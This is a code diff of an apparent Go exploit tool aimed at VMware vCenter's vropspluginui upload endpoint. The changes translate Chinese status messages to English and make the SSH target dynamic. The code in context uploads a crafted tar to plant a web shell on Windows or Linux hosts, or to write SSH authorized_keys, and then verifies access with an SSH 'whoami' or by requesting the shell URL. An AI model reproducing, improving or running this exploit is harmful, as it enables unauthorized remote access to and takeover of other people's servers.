@@ -95,7 +95,7 @@ func Upload_shell(url string, buf bytes.Buffer) bool {
 	resp, err := client.R().SetFileBytes("uploadFile", "test.tar", buf.Bytes()).Post(url + "/ui/vropspluginui/rest/services/uploadova") // Use R() to create a request.
 	if err != nil {
 		_ = err
-		fmt.Println("[-] 上传失败，请检查网络.")
+		fmt.Println("[-] Upload failure, please check network.")
 		os.Exit(0)
 	}
 	// log.Fatal(err)
@@ -114,7 +114,7 @@ func Upload_windows_shell(url, tar_content string) {
 	buffer := Generate_tar(tar_content, "windows", "?")
 	res := Upload_shell(url, buffer)
 	if !res {
-		fmt.Println("[-] Windows 上传失败，尝试Linux平台...")
+		fmt.Println("[-] Windows Upload failure，try Linux...")
 		return
 	}
 
@@ -128,7 +128,7 @@ func Upload_linux_shell(url, tar_content string) {
 		if Upload_shell(url, buffer) {
 			Check_shell(url, "linux")
 		} else {
-			fmt.Println("[-] Linux 上传失败.")
+			fmt.Println("[-] Linux pload failure.")
 			return
 		}
 
@@ -144,13 +144,14 @@ func Upload_linux_shell(url, tar_content string) {
 }
 
 func Upload_ssh_authorized_keys(url, tar_content string) {
+	target_ip := strings.Replace(url, "https://", "", 1)
 	buffer := Generate_tar(tar_content, "ssh", "?")
 	success := Upload_shell(url, buffer)
 	if !success {
-		fmt.Println("上传失败.")
+		fmt.Println("Upload failure.")
 		return
 	}
-	cmd := exec.Command("ssh", "vsphere-ui@192.168.159.159", "whoami")
+	cmd := exec.Command("ssh", "vsphere-ui@"+target_ip, "whoami")
 	output, err := cmd.Output()
 
 	if err != nil {
@@ -159,9 +160,9 @@ func Upload_ssh_authorized_keys(url, tar_content string) {
 	// 因为结果是字节数组，需要转换成string
 	res := strings.Replace((string(output)), "\n", "", 1)
 	if res == "vsphere-ui" {
-		fmt.Println("上传成功, 用户名: vsphere-ui")
+		fmt.Println("Upload success, UserName: vsphere-ui")
 	} else {
-		fmt.Println("利用失败.")
+		fmt.Println("Exploit failure.")
 		os.Exit(0)
 	}
 
@@ -185,13 +186,13 @@ func Check_shell(url string, os_name string) {
 	}
 	resp, err := client.R().Get(shell_url) // Use R() to create a request.
 	if err != nil {
-		fmt.Println("请检查网络.")
+		fmt.Println("Please check network.")
 		os.Exit(0)
 	}
 	a := resp.StatusCode
 
 	if a == 200 {
-		fmt.Println("[+] 上传成功, " + shell_url)
+		fmt.Println("[+] Upload success, " + shell_url)
 		os.Exit(0)
 
 	} else {
